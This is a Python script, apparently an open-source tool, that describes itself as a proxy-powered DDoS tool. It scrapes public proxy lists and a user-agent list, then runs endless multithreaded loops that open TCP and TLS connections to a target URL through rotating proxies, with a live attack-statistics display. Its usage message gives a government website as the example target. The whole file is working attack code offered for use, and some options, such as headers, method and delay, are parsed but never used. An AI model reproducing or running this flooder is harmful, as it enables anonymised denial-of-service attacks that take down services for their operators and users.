#!/usr/bin/env python
#version: 2.5.5-beta

#built-in libs
import collections
import threading
import argparse
import curses
import socket
import json
import time
import ssl
import sys
import os

#python version check
if sys.version_info.major != 3:
    print("[-] Please run this program with Python3")
    sys.exit()

#third-party libs
try:
    import requests
    import socks
except ImportError:
    import pip

    print("[+] Installing required libraries...")
    if not os.path.exists("requirements.txt"):
        print("[-] Requirements installation failed. \"\u001b[0;4mrequirements.txt\u001b[0;0m\" file not found")
        sys.exit()

    try:
        with open("requirements.txt") as file:
            libraries = file.read().splitlines()
            file.close()

        for library in libraries:
            pip.main(["install", library, "-U"])
    except KeyboardInterrupt:
        print(f"[-] Requirements installation has been cancelled")
        sys.exit()

    print("[+] Requirements installation has been successful. Please re-run the program to continue")
    sys.exit()

class settings:
    active_threads: int = 0
    max_threads: int = 100
    connected: int = 0
    connecting: int = 0
    status: int = 1 #0 = QUIT; 1 = PREPARING; 2 = RUNNING;

def fetchproxy() -> None:
    print("[+] Downloading proxies.txt")
    jsepoch = (int(time.time()) - (3600 * 24)) * 1000
    http = requests.get(f"https://api.openproxy.space/list?skip=0&ts={jsepoch}")

    dirname = os.path.dirname(__file__)
    proxy_path = f"{dirname}/etc/proxies.txt"

    if not os.path.exists(f"{dirname}/etc/"):
        os.mkdir(f"{dirname}/etc/")

    if os.path.exists(proxy_path):
        os.remove(proxy_path)

    proxy_list = json.loads(http.text)
    for proxy in proxy_list:
        code = proxy["code"]
        threading.Thread(target=fetchproxycode, args=[code], daemon=True).start()

    while True:
        if settings.active_threads == 0:
            break

def fetchproxycode(code: str) -> None:
    settings.active_threads += 1
    http = requests.get(f"https://api.openproxy.space/list/{code}")

    proxy = json.loads(http.text)
    protocol = proxy["protocols"][0]
    proxy_list = proxy["data"][0]["items"]

    if protocol == 1:
        protocol = "http"
    elif protocol == 3:
        protocol = "socks4"
    elif protocol == 4:
        protocol = "socks5"

    proxies_str = ""
    for proxy in proxy_list:
        proxy = proxy.strip()
        proxies_str += f"{protocol}://{proxy}\r\n"
    proxies_str = proxies_str.strip()

    dirname = os.path.dirname(__file__)
    proxy_path = f"{dirname}/etc/proxies.txt"

    with open(proxy_path, "a") as file:
        file.write(f"{proxies_str}\r\n")
        file.close()

    settings.active_threads -= 1

def fetchuseragent() -> None:
    dirname = os.path.dirname(__file__)
    useragent_path = f"{dirname}/etc/useragents.txt"

    if os.path.exists(useragent_path):
        return

    print("[+] Downloading useragents.txt")
    useragent_url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
    http = requests.get(useragent_url)

    if not os.path.exists(f"{dirname}/etc/"):
        os.mkdir(f"{dirname}/etc/")

    with open(useragent_path, "w") as file:
        file.write(http.text)
        file.close()

def loaduseragent() -> None:
    dirname = os.path.dirname(__file__)
    useragent_path = f"{dirname}/etc/useragents.txt"

    if not os.path.exists(useragent_path):
        fetchuseragent()

    with open(useragent_path) as file:
        settings.useragents = file.read().splitlines()
        file.close()

def loadproxy() -> None:
    dirname = os.path.dirname(__file__)
    proxy_path = f"{dirname}/etc/proxies.txt"

    if not os.path.exists(proxy_path):
        fetchproxy()

    with open(proxy_path) as file:
        settings.proxies = file.read().splitlines()
        file.close()

def urlsplit(url: str) -> (None, "URLObject"):
    try:
        protocol, domain = url.split("://", 1)
    except Exception:
        return

    try:
        domain, path = domain.split("/", 1)
    except Exception:
        path = ""

    try:
        domain, port = domain.split(":", 1)
    except Exception:
        port = None

    try:
        path, parameters = path.split("?", 1)
    except Exception:
        parameters = None

    if parameters == None:
        try:
            path, fragments = path.split("#", 1)
        except Exception:
            fragments = None
    else:
        try:
            parameters, fragments = parameters.split("#", 1)
        except Exception:
            fragments = None

    path = f"/{path}"
    if port == None and protocol == "https":
        port = 443
    else:
        port = 80

    url_dict = {}
    url_dict["protocol"] = protocol
    url_dict["domain"] = domain
    url_dict["port"] = port
    url_dict["path"] = path
    url_dict["parameters"] = parameters
    url_dict["fragments"] = fragments

    url_struct = collections.namedtuple("URLObject", "protocol domain port path parameters fragments")
    url_object = url_struct(**url_dict)

    return url_object

def sudos(url: str, **kwargs) -> None:
    try:
        settings.active_threads += 1
        url = urlsplit(url)

        timeout = kwargs.get("timeout")
        delay = kwargs.get("delay")
        try:
            timeout = int(timeout)
            if timeout < 0:
                timeout = 5
        except Exception:
            timeout = 5
        try:
            delay = int(delay)
            if delay < 0:
                delay = 1
        except Exception:
            delay = 1

        if kwargs.get("proxy"):
            proxy = urlsplit(kwargs.get("proxy"))
            use_proxy = True
            if not proxy:
                return
            try:
                proxy_type = getattr(socks, f"PROXY_TYPE_{proxy.protocol.upper()}")
            except Exception:
                return

        if use_proxy:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(proxy_type, proxy.domain, int(proxy.port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.settimeout(timeout)

        connected = False
        settings.connecting += 1
        sock.connect((url.domain, int(url.port)))
        settings.connected += 1
        connected = True

        kwargs.setdefault("verify_ssl", True)
        verify_ssl = kwargs.get("verify_ssl")

        if url.protocol == "https":
            context = ssl.create_default_context()
            if not verify_ssl:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=url.domain)

    except Exception as e:
        #print(f"sudos error: {e}")
        pass
    finally:
        settings.active_threads -= 1
        settings.connecting -= 1
        try:
            if connected:
                settings.connected -= 1
        except Exception:
            pass

def attackrunner(args) -> None:
    try:
        if not args.url:
            print("[-] URL is required")
            settings.status = 0
            return

        if not urlsplit(args.url):
            print(f"[-] Invalid URL format. EXAMPLE: https://cia.gov/")
            settings.status = 0
            return

        settings.max_threads = args.threads
        loaduseragent()


        kwargs = {}
        kwargs["headers"] = args.headers
        kwargs["delay"] = args.delay
        kwargs["verify_ssl"] = args.no_verify
        kwargs["method"] = args.method
        kwargs["timeout"] = args.timeout

        settings.status = 2

        if not args.no_proxy:
            if args.update_proxy:
                fetchproxy()
            loadproxy()
            while True:
                for proxy in settings.proxies:
                    proxy = proxy.strip()
                    kwargs["proxy"] = proxy
                    while True:
                        if settings.active_threads >= settings.max_threads:
                            continue
                        threading.Thread(target=sudos, args=[args.url], kwargs=kwargs, daemon=True).start()
                        break
        else:
            while True:
                if settings.active_threads >= settings.max_threads:
                    continue
                threading.Thread(target=sudos, args=[args.url], kwargs=kwargs, daemon=True).start()

    except Exception as e:
        print(f"attackrunner error: {e}")
        return
    finally:
        settings.status = 0

def c_main(scr):
    curses.curs_set(0)
    scr.clear()
    scr.addstr(0, 0, "ATTACK STATISTICS")
    while True:
        scr.addstr(1, 0, f"Threads:     {settings.active_threads}")
        scr.addstr(2, 0, f"Connecting:  {settings.connecting}")
        scr.addstr(3, 0, f"Connected:   {settings.connected}")
        scr.refresh()
        time.sleep(1)

def main():
    try:
        parser = argparse.ArgumentParser(description="SuDOS, proxy-powered DDOS tool")
        parser.add_argument("url", nargs="?", metavar="URL", help="Target URL")
        parser.add_argument("-t", "--threads", metavar="THREADS", default=100, type=int, help="Max threads")
        parser.add_argument("-u", "--update-proxy", action="store_true", help="Update current proxy list. Download if haven't yet installed")
        parser.add_argument("-p", "--no-proxy", action="store_true", help="Run attack without proxies")
        parser.add_argument("-H", "--headers", metavar="HEADERS", action="append", help="Add custom HTTP header")
        parser.add_argument("-c", "--timeout", metavar="TIMEOUT", default=5, type=int, help="Socket/Proxy connection timeout")
        parser.add_argument("-v", "--delay", metavar="DELAY", default=1, type=int, help="Sleep time between HTTP requests")
        parser.add_argument("-b", "--no-verify", action="store_false", help="Disable SSL certificate verification")
        parser.add_argument("-m", "--method", metavar="ATTACK METHOD", default=1, choices=[1, 2, 3], type=int, help="Attack method to be used")

        args = parser.parse_args()

        threading.Thread(target=attackrunner, args=[args], daemon=True).start()

        while True:
            if settings.status == 0:
                sys.exit()
            elif settings.status == 2:
                break

        #while True:
        #    pass
        curses.wrapper(c_main)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    main()
